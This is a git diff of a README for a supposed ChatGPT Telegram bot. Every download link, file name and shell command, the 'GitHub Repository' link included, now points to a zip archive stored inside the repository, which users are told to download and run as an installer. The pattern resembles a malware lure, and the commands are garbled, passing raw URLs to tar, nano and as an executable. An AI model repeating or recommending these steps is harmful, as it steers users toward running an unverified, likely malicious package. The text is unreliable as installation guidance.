@@ -1,6 +1,6 @@
 # 🤖 ChatGPT-TelegramBot-Pro - Your AI Assistant on Telegram
 
-[![Download Latest Release](https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip%20Latest%https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip)](https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip%20Latest%https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip)](https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip)
 
 ## 💡 Overview
 
@@ -21,11 +21,11 @@ Before installing, make sure your system meets the following requirements:
 
 ### 🔗 Download & Install
 
-To get the bot, [visit this page to download](https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip).
+To get the bot, [visit this page to download](https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release version and click on it.
-3. Look for the installation package suitable for your operating system (e.g., .exe for Windows, https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip for Linux).
+3. Look for the installation package suitable for your operating system (e.g., .exe for Windows, https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip for Linux).
 4. Download the file to your computer.
 
 ### 🛠️ Installation
@@ -38,17 +38,17 @@ To get the bot, [visit this page to download](https://raw.githubusercontent.com/
 
 #### macOS Installation
 
-1. Open the `https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip` file that you downloaded.
+1. Open the `https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip` file that you downloaded.
 2. Drag and drop the application into your Applications folder.
 3. Open the application from your Applications.
 
 #### Linux Installation
 
 1. Open a terminal window.
-2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip` file.
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip` file.
 3. Extract the files using:
    ```bash
-   tar -xvzf https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip
+   tar -xvzf https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip
    ```
 4. Navigate to the extracted folder:
    ```bash
@@ -56,7 +56,7 @@ To get the bot, [visit this page to download](https://raw.githubusercontent.com/
    ```
 5. Run the installer with:
    ```bash
-   https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip
+   https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip
    ```
 
 ## ⚙️ Configuration
@@ -72,7 +72,7 @@ Before you can use the bot, you need to set it up with your Telegram credentials
 
 3. Open the configuration file in your installation directory to add your token:
    ```bash
-   nano https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip
+   nano https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip
    ```
 4. Replace the placeholder text with your token and save the file.
 
@@ -103,7 +103,7 @@ To contribute to the project, follow these steps:
 
 ## 🔗 Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip)
-- [Download Release](https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/handlers/Bot_Chat_GP_Pro_Telegram_2.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip)
+- [Download Release](https://raw.githubusercontent.com/alexa2851/ChatGPT-TelegramBot-Pro/main/services/GP-Bot-Telegram-Chat-Pro-v1.3.zip)
 
 Feel free to reach out if you have questions or need assistance. Enjoy your ChatGPT Telegram Bot!
